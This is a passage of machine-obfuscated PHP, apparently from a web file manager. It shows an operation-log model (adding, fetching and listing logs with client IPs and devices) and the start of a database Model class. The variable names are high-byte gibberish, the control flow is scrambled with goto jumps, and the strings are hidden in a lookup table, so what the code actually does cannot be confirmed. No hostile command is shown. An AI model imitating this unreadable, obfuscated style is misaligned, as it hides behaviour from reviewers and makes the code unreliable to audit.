LNG($eˆõ¡š·¬Ù[2366]), $eˆõ¡š·¬Ù[2045] => LNG($eˆõ¡š·¬Ù[2367]), $eˆõ¡š·¬Ù[2368] => LNG($eˆõ¡š·¬Ù[2369]), $eˆõ¡š·¬Ù[2370] => LNG($eˆõ¡š·¬Ù[2371]), $eˆõ¡š·¬Ù[2372] => LNG($eˆõ¡š·¬Ù[2373]), $eˆõ¡š·¬Ù[2374] => LNG($eˆõ¡š·¬Ù[2375]), $eˆõ¡š·¬Ù[2376] => LNG($eˆõ¡š·¬Ù[2377]), $eˆõ¡š·¬Ù[2039] => LNG($eˆõ¡š·¬Ù[2378]), $eˆõ¡š·¬Ù[2379] => LNG($eˆõ¡š·¬Ù[2380]), $eˆõ¡š·¬Ù[2381] => LNG($eˆõ¡š·¬Ù[2382]), $eˆõ¡š·¬Ù[2383] => LNG($eˆõ¡š·¬Ù[2383]), $eˆõ¡š·¬Ù[2384] => LNG($eˆõ¡š·¬Ù[2010]), $eˆõ¡š·¬Ù[2385] => LNG($eˆõ¡š·¬Ù[2386]), $eˆõ¡š·¬Ù[2387] => LNG($eˆõ¡š·¬Ù[2388]), $eˆõ¡š·¬Ù[2389] => LNG($eˆõ¡š·¬Ù[2390]), $eˆõ¡š·¬Ù[2391] => LNG($eˆõ¡š·¬Ù[2392]), $eˆõ¡š·¬Ù[2393] => LNG($eˆõ¡š·¬Ù[2394]), $eˆõ¡š·¬Ù[2395] => LNG($eˆõ¡š·¬Ù[2395]), $eˆõ¡š·¬Ù[2396] => LNG($eˆõ¡š·¬Ù[2397]), $eˆõ¡š·¬Ù[2398] => LNG($eˆõ¡š·¬Ù[2399]), $eˆõ¡š·¬Ù[2400] => LNG($eˆõ¡š·¬Ù[2401]), $eˆõ¡š·¬Ù[2402] => LNG($eˆõ¡š·¬Ù[2403]), $eˆõ¡š·¬Ù[2404] => LNG($eˆõ¡š·¬Ù[2405]), $eˆõ¡š·¬Ù[2406] => LNG($eˆõ¡š·¬Ù[2407])); } private function typeFile() { $F„¯ÁÃ‰¿Ò =& $_SERVER[ºÖÙÂŒäÉê‡]; $Bë—ÅÈê½â = array($F„¯ÁÃ‰¿Ò[2041] => array($F„¯ÁÃ‰¿Ò[2042]), $F„¯ÁÃ‰¿Ò[2352] => array($F„¯ÁÃ‰¿Ò[2408]), $F„¯ÁÃ‰¿Ò[2354] => array($F„¯ÁÃ‰¿Ò[2409]), $F„¯ÁÃ‰¿Ò[2035] => array($F„¯ÁÃ‰¿Ò[2036]), $F„¯ÁÃ‰¿Ò[2360] => array(), $F„¯ÁÃ‰¿Ò[2362] => array(), $F„¯ÁÃ‰¿Ò[2364] => array(), $F„¯ÁÃ‰¿Ò[2044] => array($F„¯ÁÃ‰¿Ò[2046]), $F„¯ÁÃ‰¿Ò[2045] => array($F„¯ÁÃ‰¿Ò[2046]), $F„¯ÁÃ‰¿Ò[2368] => array($F„¯ÁÃ‰¿Ò[2410]), $F„¯ÁÃ‰¿Ò[2370] => array($F„¯ÁÃ‰¿Ò[2410]), $F„¯ÁÃ‰¿Ò[2372] => array($F„¯ÁÃ‰¿Ò[2411]), $F„¯ÁÃ‰¿Ò[2358] => array($F„¯ÁÃ‰¿Ò[2412]), $F„¯ÁÃ‰¿Ò[2374] => array($F„¯ÁÃ‰¿Ò[2413]), $F„¯ÁÃ‰¿Ò[2376] => array($F„¯ÁÃ‰¿Ò[2414]), $F„¯ÁÃ‰¿Ò[2039] => array($F„¯ÁÃ‰¿Ò[2040])); return $Bë—ÅÈê½â; } private function typeAll() { goto B‡Ö•®ë´; B‡Ö•®ë´: $b¨²†‹êÄº =& $_SERVER[ºÖÙÂŒäÉê‡]; $FŸ‘¿êå÷£ = $this->typeList; $cÉ•°òòÛæ = array_filter($this->typeFile()); goto b­Ù‰À…æè; b­Ù‰À…æè: foreach ($cÉ•°òòÛæ as $cÃñ¸Å¬™ => $EÂ›Ğš•âÒ) { $FŸ‘¿êå÷£[$EÂ›Ğš•âÒ[0]] = $FŸ‘¿êå÷£[$cÃñ¸Å¬™]; } $FŸ‘¿êå÷£[$b¨²†‹êÄº[2046]] = LNG($b¨²†‹êÄº[2415]); $FŸ‘¿êå÷£[$b¨²†‹êÄº[2410]] = LNG($b¨²†‹êÄº[2416]); goto CÊö ›‘À; CÊö ›‘À: return $FŸ‘¿êå÷£; goto dÙ­„¥†Ù; dÙ­„¥†Ù: } public function addLog($DÏÜ­¢Èñ, $Bˆéãì«©‘ = array()) { goto d‰Îæ‹±¿ó; Eˆ‰Â°•…ì: $C„°îŒÂ = get_client_ip(); if (!$Bˆéãì«©‘ || strlen(json_encode($Bˆéãì«©‘)) >= 1024) { $Bˆéãì«©‘ = array($DİŞ©ßÃ¿Ø[2417] => $C„°îŒÂ); } else { if (is_array($Bˆéãì«©‘)) { $Bˆéãì«©‘[$DİŞ©ßÃ¿Ø[2417]] = $C„°îŒÂ; } else { $Bˆéãì«©‘ = array($DİŞ©ßÃ¿Ø[1024] => $Bˆéãì«©‘, $DİŞ©ßÃ¿Ø[2417] => $C„°îŒÂ); } } $Bˆéãì«©‘ = array($DİŞ©ßÃ¿Ø[1393] => Session::sign(), $DİŞ©ßÃ¿Ø[1394] => $a˜Ù ó™ğ¯, $DİŞ©ßÃ¿Ø[29] => $DÏÜ­¢Èñ, $DİŞ©ßÃ¿Ø[1396] => json_encode($Bˆéãì«©‘)); goto F´«†‚Ûâİ; F´«†‚Ûâİ: parent::add($Bˆéãì«©‘); goto Eœ„—…õÎô; d‰Îæ‹±¿ó: $DİŞ©ßÃ¿Ø =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!isset($this->typeList[$DÏÜ­¢Èñ])) { return; } $a˜Ù ó™ğ¯ = USER_ID ? USER_ID : (isset($Bˆéãì«©‘[$DİŞ©ßÃ¿Ø[1403]]) ? $Bˆéãì«©‘[$DİŞ©ßÃ¿Ø[1403]] : 0); goto Eˆ‰Â°•…ì; Eœ„—…õÎô: } public function remove($D†’Éó‘†ç) { $this->where(array($_SERVER[ºÖÙÂŒäÉê‡][390] => $D†’Éó‘†ç))->delete(); } private function _makeOrder($d³šÄäÔ”˜ = '') { goto DÊ”æ‹Í¥•; DÊ”æ‹Í¥•: $E”ß—Ï¶ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Aä‹Í÷Õ = $E”ß—Ï¶[193]; $Eµ–À£¥½Ÿ = array($E”ß—Ï¶[406] => $E”ß—Ï¶[407], $E”ß—Ï¶[408] => $E”ß—Ï¶[409]); goto a®‰éµÕ…; Fµ¤àİéÊÙ: return $this->order($d³šÄäÔ”˜); goto cÌ³‚…œ¢; a®‰éµÕ…: $Bƒ·ÇŠ–ŒŞ = Input::get($E”ß—Ï¶[412], $E”ß—Ï¶[7], $E”ß—Ï¶[2204], array($E”ß—Ï¶[2141], $E”ß—Ï¶[408])); $Bƒ·ÇŠ–ŒŞ = $Eµ–À£¥½Ÿ[$Bƒ·ÇŠ–ŒŞ]; $d³šÄäÔ”˜ = $d³šÄäÔ”˜ . "{$Aä‹Í÷Õ}\x20{$Bƒ·ÇŠ–ŒŞ}"; goto Fµ¤àİéÊÙ; cÌ³‚…œ¢: } public function get($F¡ÍÙëøµÆ = '') { goto EôÏ¼–šïÒ; E‚ƒÏ®›ğí: if ($F¡ÍÙëøµÆ[$dÑ—ˆÏ’À[1403]]) { $Bàâ»ó‡”¡[$dÑ—ˆÏ’À[1403]] = $F¡ÍÙëøµÆ[$dÑ—ˆÏ’À[1403]]; } if (isset($F¡ÍÙëøµÆ[$dÑ—ˆÏ’À[699]])) { $Cãö¢ÉÊ = $F¡ÍÙëøµÆ[$dÑ—ˆÏ’À[699]]; $b‚¸õ¤áƒÄ = isset($F¡ÍÙëøµÆ[$dÑ—ˆÏ’À[700]]) ? $F¡ÍÙëøµÆ[$dÑ—ˆÏ’À[700]] : time(); $Bàâ»ó‡”¡[$dÑ—ˆÏ’À[193]] = array($dÑ—ˆÏ’À[326], array($Cãö¢ÉÊ, $b‚¸õ¤áƒÄ)); } if ($F¡ÍÙëøµÆ[$dÑ—ˆÏ’À[29]]) { $dæ‹ŞÙ‹î‚ = explode($dÑ—ˆÏ’À[47], $F¡ÍÙëøµÆ[$dÑ—ˆÏ’À[29]]); $e³ò¢Şá±Ş = $this->typeFile(); $f…­Ó‘…Ëö = array(); foreach ($dæ‹ŞÙ‹î‚ as $B·¾ø¡Åù‡) { $f…­Ó‘…Ëö[] = $B·¾ø¡Åù‡; if (isset($e³ò¢Şá±Ş[$B·¾ø¡Åù‡])) { $f…­Ó‘…Ëö = array_merge($f…­Ó‘…Ëö, $e³ò¢Şá±Ş[$B·¾ø¡Åù‡]); } } $f…­Ó‘…Ëö = array_unique($f…­Ó‘…Ëö); if ($f…­Ó‘…Ëö) { $Bàâ»ó‡”¡[$dÑ—ˆÏ’À[29]] = array($dÑ—ˆÏ’À[7], $f…­Ó‘…Ëö); } } goto DçÑÑ²×µ£; d”â¦¯¨â: $A®²æçŠ†·[$dÑ—ˆÏ’À[359]] = $this->logList($A®²æçŠ†·[$dÑ—ˆÏ’À[359]]); return $A®²æçŠ†·; goto Cİê—…ŒËÍ; DçÑÑ²×µ£: if (!empty($F¡ÍÙëøµÆ[$dÑ—ˆÏ’À[2417]])) { $Bàâ»ó‡”¡[$dÑ—ˆÏ’À[409]] = array($dÑ—ˆÏ’À[750], "\45{$F¡ÍÙëøµÆ[$dÑ—ˆÏ’À[2417]]}\x25"); } $A®²æçŠ†· = $this->_makeOrder()->where($Bàâ»ó‡”¡)->selectPage(); if (empty($A®²æçŠ†·[$dÑ—ˆÏ’À[359]])) { show_json(array(), !0, $A®²æçŠ†·[$dÑ—ˆÏ’À[356]]); } goto d”â¦¯¨â; EôÏ¼–šïÒ: $dÑ—ˆÏ’À =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$F¡ÍÙëøµÆ) { show_json(array()); } $Bàâ»ó‡”¡ = array(); goto E‚ƒÏ®›ğí; Cİê—…ŒËÍ: } private function ipAddress(&$cÆÄìŸ„Ì) { $FˆŒµÖ“ˆ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!empty($cÆÄìŸ„Ì[$FˆŒµÖ“ˆ[2417]])) { $aïõñê›Ã¡ = IpLocation::get($cÆÄìŸ„Ì[$FˆŒµÖ“ˆ[2417]]); if ($aïõñê›Ã¡ == $FˆŒµÖ“ˆ[2418]) { $aïõñê›Ã¡ = $FˆŒµÖ“ˆ[2419]; } } else { $aïõñê›Ã¡ = LNG($FˆŒµÖ“ˆ[2420]); } $cÆÄìŸ„Ì[$FˆŒµÖ“ˆ[2421]] = $aïõñê›Ã¡; } private function descZipDownload($F·¯Ğ°±, &$B£’¾šâ¿³) { $cÒ–èâÚÕ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!isset($F·¯Ğ°±[$cÒ–èâÚÕ[2422]])) { return; } $f‡ÑÚòßøÜ = json_decode($F·¯Ğ°±[$cÒ–èâÚÕ[2422]], !0); foreach ($f‡ÑÚòßøÜ as $AŸàÕäË±ã) { if (!IO::init($AŸàÕäË±ã[$cÒ–èâÚÕ[75]])) { continue; } if (!($Fäí¡´ôŞ— = IO::infoFull($AŸàÕäË±ã[$cÒ–èâÚÕ[75]]))) { continue; } $F·¯Ğ°±[$cÒ–èâÚÕ[75]] = $AŸàÕäË±ã[$cÒ–èâÚÕ[75]]; $B£’¾šâ¿³[] = $F·¯Ğ°±[$cÒ–èâÚÕ[374]] = $Fäí¡´ôŞ—[$cÒ–èâÚÕ[374]]; $B£’¾šâ¿³[] = $F·¯Ğ°±[$cÒ–èâÚÕ[2237]] = $Fäí¡´ôŞ—[$cÒ–èâÚÕ[465]]; break; } return $F·¯Ğ°±; } private function getSourceList(&$c­™¼¶ƒÛÅ) { $f—¤øÙ¹Š§ =& $_SERVER[ºÖÙÂŒäÉê‡]; $e–Æß§ÕÓ = array(); foreach ($c­™¼¶ƒÛÅ as $eí¸ƒ—Å‚ => $A¯•‹†ÜÜé) { goto aÇ¦‰¢–àÍ; AìŠİ¤ä©: if ($dœĞ¨Ëé½[$f—¤øÙ¹Š§[29]] == $f—¤øÙ¹Š§[2245]) { $e–Æß§ÕÓ[] = $dœĞ¨Ëé½[$f—¤øÙ¹Š§[409]][$f—¤øÙ¹Š§[374]]; } goto cĞ¼æ“øª¼; DÍÛ–Ù¸íÌ: $e–Æß§ÕÓ[] = $dœĞ¨Ëé½[$f—¤øÙ¹Š§[374]]; $e–Æß§ÕÓ[] = $dœĞ¨Ëé½[$f—¤øÙ¹Š§[2237]]; if ($dœĞ¨Ëé½[$f—¤øÙ¹Š§[29]] == $f—¤øÙ¹Š§[496]) { $e–Æß§ÕÓ[] = $dœĞ¨Ëé½[$f—¤øÙ¹Š§[409]][$f—¤øÙ¹Š§[996]]; $e–Æß§ÕÓ[] = $dœĞ¨Ëé½[$f—¤øÙ¹Š§[409]][$f—¤øÙ¹Š§[997]]; } goto AìŠİ¤ä©; aÇ¦‰¢–àÍ: $dœĞ¨Ëé½ = json_decode($A¯•‹†ÜÜé[$f—¤øÙ¹Š§[409]], !0); if ($A¯•‹†ÜÜé[$f—¤øÙ¹Š§[29]] == $f—¤øÙ¹Š§[2038]) { $dœĞ¨Ëé½ = $this->descZipDownload($dœĞ¨Ëé½, $e–Æß§ÕÓ); $c­™¼¶ƒÛÅ[$eí¸ƒ—Å‚][$f—¤øÙ¹Š§[409]] = json_encode($dœĞ¨Ëé½); continue; } if (strpos($A¯•‹†ÜÜé[$f—¤øÙ¹Š§[29]], $f—¤øÙ¹Š§[2238]) !== 0) { goto DàµÔŒŒ¶¸; A¶ïŠ¢„©ğ: continue; goto CÜˆŠ÷¶ç; Dïâ¾²‘ªğ: $e–Æß§ÕÓ[] = $dœĞ¨Ëé½[$f—¤øÙ¹Š§[374]] = $Fö¨ªÊÄò[$f—¤øÙ¹Š§[374]]; $e–Æß§ÕÓ[] = $dœĞ¨Ëé½[$f—¤øÙ¹Š§[2237]] = $Fö¨ªÊÄò[$f—¤øÙ¹Š§[465]]; $c­™¼¶ƒÛÅ[$eí¸ƒ—Å‚][$f—¤øÙ¹Š§[409]] = json_encode($dœĞ¨Ëé½); goto A¶ïŠ¢„©ğ; DàµÔŒŒ¶¸: if (!isset($dœĞ¨Ëé½[$f—¤øÙ¹Š§[75]]) || strpos($A¯•‹†ÜÜé[$f—¤øÙ¹Š§[29]], $f—¤øÙ¹Š§[2423]) !== 0) { continue; } if (!IO::init($dœĞ¨Ëé½[$f—¤øÙ¹Š§[75]])) { continue; } if (!($Fö¨ªÊÄò = IO::infoFull($dœĞ¨Ëé½[$f—¤øÙ¹Š§[75]]))) { continue; } goto Dïâ¾²‘ªğ; CÜˆŠ÷¶ç: } goto DÍÛ–Ù¸íÌ; cĞ¼æ“øª¼: } if (!$e–Æß§ÕÓ) { return array(); } return Model($f—¤øÙ¹Š§[751])->sourceListInfo($e–Æß§ÕÓ, !0); } private function logList($Dôç÷ÓÁ‡¬) { goto fÒéƒ¶ÜİÁ; Cø¶òšŞÙŒ: $Bè´Ñæ´ = array(); foreach ($Dôç÷ÓÁ‡¬ as $CÊÕ£Ü÷­¹ => $eß»Àà„òö) { goto CŸÔ¤ŞÀ‹–; b¿Úµ‘â‰ì: $eß»Àà„òö[$A÷ğ”’Æ‰[28]] = isset($Døˆ²°†¦[$A÷ğ”’Æ‰[28]]) ? $Døˆ²°†¦[$A÷ğ”’Æ‰[28]] : LNG($A÷ğ”’Æ‰[2420]); $eß»Àà„òö[$A÷ğ”’Æ‰[2286]] = isset($Døˆ²°†¦[$A÷ğ”’Æ‰[2286]]) ? $Døˆ²°†¦[$A÷ğ”’Æ‰[2286]] : $A÷ğ”’Æ‰[33]; $eß»Àà„òö[$A÷ğ”’Æ‰[1309]] = isset($E…æÇŒ¯Øğ[$E¹±†à—¹®]) ? $E…æÇŒ¯Øğ[$E¹±†à—¹®] : $Dœ§Ü–éÏ; goto A–©ƒ†Ø«; dÊŞŞ¯èà‘: unset($eß»Àà„òö[$A÷ğ”’Æ‰[2426]]); $Dµ†šÌ±£Ä[] = $eß»Àà„òö; goto CÇ‰œĞĞºé; fÖÆ¨ÚíÈÅ: $this->ipAddress($eß»Àà„òö); if (strpos($E¹±†à—¹®, $A÷ğ”’Æ‰[2238]) === 0 || isset($e„ç¨Õ¼Á[$A÷ğ”’Æ‰[2237]])) { goto cê«ÎŒ”‘; cê«ÎŒ”‘: $e„ç¨Õ¼Á[$A÷ğ”’Æ‰[396]] = $a¦ŠğÎÂ³‘[$e„ç¨Õ¼Á[$A÷ğ”’Æ‰[374]]]; $e„ç¨Õ¼Á[$A÷ğ”’Æ‰[2250]] = $a¦ŠğÎÂ³‘[$e„ç¨Õ¼Á[$A÷ğ”’Æ‰[2237]]]; if ($e„ç¨Õ¼Á[$A÷ğ”’Æ‰[29]] == $A÷ğ”’Æ‰[496]) { $e„ç¨Õ¼Á[$A÷ğ”’Æ‰[409]][$A÷ğ”’Æ‰[996]] = $a¦ŠğÎÂ³‘[$e„ç¨Õ¼Á[$A÷ğ”’Æ‰[409]][$A÷ğ”’Æ‰[996]]]; $e„ç¨Õ¼Á[$A÷ğ”’Æ‰[409]][$A÷ğ”’Æ‰[997]] = $a¦ŠğÎÂ³‘[$e„ç¨Õ¼Á[$A÷ğ”’Æ‰[409]][$A÷ğ”’Æ‰[997]]]; } goto fÍßµöÇŸï; fÍßµöÇŸï: if ($e„ç¨Õ¼Á[$A÷ğ”’Æ‰[29]] == $A÷ğ”’Æ‰[2245]) { $e„ç¨Õ¼Á[$A÷ğ”’Æ‰[409]][$A÷ğ”’Æ‰[374]] = $a¦ŠğÎÂ³‘[$e„ç¨Õ¼Á[$A÷ğ”’Æ‰[409]][$A÷ğ”’Æ‰[374]]]; } if ($e„ç¨Õ¼Á[$A÷ğ”’Æ‰[29]] == $A÷ğ”’Æ‰[2033]) { $e„ç¨Õ¼Á[$A÷ğ”’Æ‰[2250]] = $e„ç¨Õ¼Á[$A÷ğ”’Æ‰[396]]; $e„ç¨Õ¼Á[$A÷ğ”’Æ‰[2237]] = $e„ç¨Õ¼Á[$A÷ğ”’Æ‰[2250]][$A÷ğ”’Æ‰[374]]; $e„ç¨Õ¼Á[$A÷ğ”’Æ‰[396]] = !1; $e„ç¨Õ¼Á[$A÷ğ”’Æ‰[374]] = $A÷ğ”’Æ‰[33]; } if ($e„ç¨Õ¼Á[$A÷ğ”’Æ‰[396]] && $e„ç¨Õ¼Á[$A÷ğ”’Æ‰[396]][$A÷ğ”’Æ‰[376]] == $A÷ğ”’Æ‰[1070]) { $Bè´Ñæ´[] = $eß»Àà„òö[$A÷ğ”’Æ‰[372]]; unset($Dôç÷ÓÁ‡¬[$CÊÕ£Ü÷­¹]); continue; } goto e÷‰éÄ‚×œ; e÷‰éÄ‚×œ: if ($e„ç¨Õ¼Á[$A÷ğ”’Æ‰[2250]] && $e„ç¨Õ¼Á[$A÷ğ”’Æ‰[2250]][$A÷ğ”’Æ‰[376]] == $A÷ğ”’Æ‰[1070]) { $Bè´Ñæ´[] = $eß»Àà„òö[$A÷ğ”’Æ‰[372]]; unset($Dôç÷ÓÁ‡¬[$CÊÕ£Ü÷­¹]); continue; } goto FùİŠ¬¤®; FùİŠ¬¤®: } $eß»Àà„òö[$A÷ğ”’Æ‰[409]] = $e„ç¨Õ¼Á; goto dÊŞŞ¯èà‘; A–©ƒ†Ø«: $eß»Àà„òö[$A÷ğ”’Æ‰[2203]] = $Døˆ²°†¦; $e„ç¨Õ¼Á = json_decode($eß»Àà„òö[$A÷ğ”’Æ‰[409]], !0); $eß»Àà„òö[$A÷ğ”’Æ‰[2417]] = isset($e„ç¨Õ¼Á[$A÷ğ”’Æ‰[2417]]) ? $e„ç¨Õ¼Á[$A÷ğ”’Æ‰[2417]] : $A÷ğ”’Æ‰[33]; goto fÖÆ¨ÚíÈÅ; CŸÔ¤ŞÀ‹–: $E¹±†à—¹® = $eß»Àà„òö[$A÷ğ”’Æ‰[29]]; $Døˆ²°†¦ = isset($A’‘Âì´©[$eß»Àà„òö[$A÷ğ”’Æ‰[1403]]]) ? $A’‘Âì´©[$eß»Àà„òö[$A÷ğ”’Æ‰[1403]]] : !1; $Dœ§Ü–éÏ = strpos($E¹±†à—¹®, $A÷ğ”’Æ‰[2424]) === 0 ? LNG($A÷ğ”’Æ‰[2425]) : LNG($A÷ğ”’Æ‰[2420]); goto b¿Úµ‘â‰ì; CÇ‰œĞĞºé: } $this->clearSystemPathLog($Bè´Ñæ´); goto dÔ£Éß÷ª; eäË†ùÒ™Ñ: $a¦ŠğÎÂ³‘ = $this->getSourceList($Dôç÷ÓÁ‡¬); $E…æÇŒ¯Øğ = $this->typeAll(); $Dµ†šÌ±£Ä = array(); goto Cø¶òšŞÙŒ; fÒéƒ¶ÜİÁ: $A÷ğ”’Æ‰ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Cñ“£³¥¡ï = array_to_keyvalue($Dôç÷ÓÁ‡¬, $A÷ğ”’Æ‰[33], $A÷ğ”’Æ‰[1403]); $A’‘Âì´© = Model($A÷ğ”’Æ‰[481])->userListInfo(array_unique($Cñ“£³¥¡ï)); goto eäË†ùÒ™Ñ; dÔ£Éß÷ª: return $Dµ†šÌ±£Ä; goto e ’Ş» »; e ’Ş» »: } private function clearSystemPathLog($E¹Íé°Òõ) { $E­’òùÃõ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (count($E¹Íé°Òõ) == 0) { return; } $fÜóÙéÆá = array($E­’òùÃõ[372] => array($E­’òùÃõ[7], array_unique($E¹Íé°Òõ))); $this->where($fÜóÙéÆá)->delete(); } public function deviceList($FÂï¢˜•‰, $C‰¨ŞæŠ…Ê = 0) { $Dš„Õñ¸ã¡ =& $_SERVER[ºÖÙÂŒäÉê‡]; $c¬ùçÕàåë = array($Dš„Õñ¸ã¡[1403] => $FÂï¢˜•‰, $Dš„Õñ¸ã¡[193] => array($Dš„Õñ¸ã¡[920], $C‰¨ŞæŠ…Ê), $Dš„Õñ¸ã¡[29] => $Dš„Õñ¸ã¡[2006]); $EÚÌ×¶ÛĞ = array(); $C›¸Ü£“ä• = $this->field($Dš„Õñ¸ã¡[2427])->where($c¬ùçÕàåë)->order($Dš„Õñ¸ã¡[2248])->limit(50)->select(); foreach ($C›¸Ü£“ä• as $cªÕáø† => $C²ºƒÜ¿ä) { goto eƒ´‚ÏËê; a³ÔìÉçİ÷: $this->ipAddress($C²ºƒÜ¿ä); $C²ºƒÜ¿ä[$Dš„Õñ¸ã¡[409]] = $E®¡…ËäÌ•; $EÚÌ×¶ÛĞ[$CáğŒÏµã] = $C²ºƒÜ¿ä; goto dç†…§Û¯; D¿àŸõ²ë: unset($E®¡…ËäÌ•[$Dš„Õñ¸ã¡[2417]]); $CáğŒÏµã = $this->deviceType($E®¡…ËäÌ•[$Dš„Õñ¸ã¡[2239]]); if (isset($EÚÌ×¶ÛĞ[$CáğŒÏµã])) { continue; } goto a³ÔìÉçİ÷; eƒ´‚ÏËê: if ($cªÕáø† > 0 && abs($C²ºƒÜ¿ä[$Dš„Õñ¸ã¡[193]] - $C›¸Ü£“ä•[$cªÕáø† - 1][$Dš„Õñ¸ã¡[193]]) < 5) { continue; } $E®¡…ËäÌ• = json_decode($C²ºƒÜ¿ä[$Dš„Õñ¸ã¡[409]], !0); $C²ºƒÜ¿ä[$Dš„Õñ¸ã¡[2417]] = isset($E®¡…ËäÌ•[$Dš„Õñ¸ã¡[2417]]) ? $E®¡…ËäÌ•[$Dš„Õñ¸ã¡[2417]] : $Dš„Õñ¸ã¡[33]; goto D¿àŸõ²ë; dç†…§Û¯: } return array_values($EÚÌ×¶ÛĞ); } public function deviceType($c‰ÍŠ™¶Œ) { return $c‰ÍŠ™¶Œ; } } goto BŒÇ¦¬Â»…; E ×£ùÚ¬·: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\x6c\x65", "\157\162\144\145\x72", "\141\154\x69\141\163", "\x68\x61\x76\x69\156\147", "\x67\162\x6f\165\x70", "\154\157\x63\153", "\x64\151\x73\164\x69\x6e\143\x74", "\141\165\x74\157", "\146\151\x6c\164\x65\162", "\x76\141\154\151\144\x61\164\x65", "\x72\145\x73\x75\x6c\164", "\x62\151\156\144", "\164\157\153\145\156"); public function __construct($FĞŠ¾ÁˆÒ = '', $cŸ—Ş‘¡Â÷ = '', $EĞ×Éò‚¨ = '') { $fÖº´£Íî =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->_initialize(); if (!empty($FĞŠ¾ÁˆÒ)) { if (strpos($FĞŠ¾ÁˆÒ, $fÖº´£Íî[91])) { list($this->dbName, $this->name) = explode($fÖº´£Íî[91], $FĞŠ¾ÁˆÒ); } else { $this->name = $FĞŠ¾ÁˆÒ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($cŸ—Ş‘¡Â÷)) { $this->tablePrefix = $fÖº´£Íî[33]; } elseif ($fÖº´£Íî[33] != $cŸ—Ş‘¡Â÷) { $this->tablePrefix = $cŸ—Ş‘¡Â÷; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($fÖº´£Íî[237]); } $this->db(0, empty($this->connection) ? $EĞ×Éò‚¨ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $a©ÇóÄá– =& $_SERVER[ºÖÙÂŒäÉê‡]; if (empty($this->fields)) { if (think_config($a©ÇóÄá–[238])) { $e»–äœĞ¨ß = $this->dbName ? $this->dbName : think_config($a©ÇóÄá–[239]); $eÉŸÍå·»ö = think_var_cache($a©ÇóÄá–[240] . strtolower(get_path_this($e»–äœĞ¨ß) . $a©ÇóÄá–[91] . $this->name)); if ($eÉŸÍå·»ö) { $B¬àÓÚŞé = think_config($a©ÇóÄá–[241]); if (empty($B¬àÓÚŞé) || $eÉŸÍå·»ö[$a©ÇóÄá–[242]] == $B¬àÓÚŞé) { $this->fields = $eÉŸÍå·»ö; return; } } } $this->flush(); } } public function flush() { goto CË©‹Íî»Ó; Cí™—Í¨½™: if (think_config($A¿›àÏ›ìß[238])) { $CÉ‰Á»œ¼ = $this->dbName ? $this->dbName : think_config($A¿›àÏ›ìß[239]); think_var_cache($A¿›àÏ›ìß[240] . strtolower(get_path_this($CÉ‰Á»œ¼) . $A¿›àÏ›ìß[91] . $this->name), $this->fields); } goto f»Şö·…; F¼ƒÚ‹¥§Á: if (!$b‹ø¨­½Ë÷) { return !1; } $this->fields = array_keys($b‹ø¨­½Ë÷); $this->fields[$A¿›àÏ›ìß[243]] = !1; goto d¡´¯·°–‘; d¡´¯·°–‘: foreach ($b‹ø¨­½Ë÷ as $DëÄÁ™Ñ‚½ => $aƒê„’®©Ğ) { $aÔÑçã—[$DëÄÁ™Ñ‚½] = $aƒê„’®©Ğ[$A¿›àÏ›ìß[29]]; if ($aƒê„’®©Ğ[$A¿›àÏ›ìß[36]]) { $this->fields[$A¿›àÏ›ìß[244]] = $DëÄÁ™Ñ‚½; if ($aƒê„’®©Ğ[$A¿›àÏ›ìß[39]]) { $this->fields[$A¿›àÏ›ìß[243]] = !0; } } } $this->fields[$A¿›àÏ›ìß[245]] = $aÔÑçã—; if (think_config($A¿›àÏ›ìß[241])) { $this->fields[$A¿›àÏ›ìß[242]] = think_config($A¿›àÏ›ìß[241]); } goto Cí™—Í¨½™; CË©‹Íî»Ó: $A¿›àÏ›ìß =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->db->setModel($this->name); $b‹ø¨­½Ë÷ = $this->db->getFields($this->getTableName()); goto F¼ƒÚ‹¥§Á; f»Şö·…: } public function switchModel($BÖ¹¸æœÈÎ, $BÎîÜƒéé = array()) { $eø‚´çÊçË =& $_SERVER[ºÖÙÂŒäÉê‡]; $bÃ Øï‹¦® = ucwords(strtolower($BÖ¹¸æœÈÎ)) . $eø‚´çÊçË[246]; if (!class_exists($bÃ Øï‹¦®)) { think_exception($bÃ Øï‹¦® . think_lang($eø‚´çÊçË[247])); } $this->_extModel = new $bÃ Øï‹¦®($this->name); if (!empty($BÎîÜƒéé)) { foreach ($BÎîÜƒéé as $fä¶»òçä¶) { $this->_extModel->setProperty($fä¶»òçä¶, $this->{$fä¶»òçä¶}); } } return $this->_extModel; } public function __set($bí¡Õº°Œ, $c‘…à¼•¤Å) { $this->data[$bí¡Õº°Œ] = $c‘…à¼•¤Å; } public function __get($D ÎÅÙ¿£ô) { return isset($this->data[$D ÎÅÙ¿£ô]) ? $this->data[$D ÎÅÙ¿£ô] : null; } public function __isset($Dµ–¸æˆ÷) { return isset($this->data[$Dµ–¸æˆ÷]); } public function __unset($EÁ¦·Ù±ï) { unset($this->data[$EÁ¦·Ù±ï]); } public function __call($A¨İÊ¨¨¶ƒ, $fœÈØØ‘Á) { $FËå•Öİ« =& $_SERVER[ºÖÙÂŒäÉê‡]; if (in_array(strtolower($A¨İÊ¨¨¶ƒ), $this->methods, !0)) { $this->options[strtolower($A¨İÊ¨¨¶ƒ)] = $fœÈØØ‘Á[0]; return $this; } elseif (in_array(strtolower($A¨İÊ¨¨¶ƒ), array($FËå•Öİ«[248], $FËå•Öİ«[249], $FËå•Öİ«[250], $FËå•Öİ«[251], $FËå•Öİ«[252]), !0)) { $e´Ô¯º’Ì = isset($fœÈØØ‘Á[0]) ? $fœÈØØ‘Á[0] : 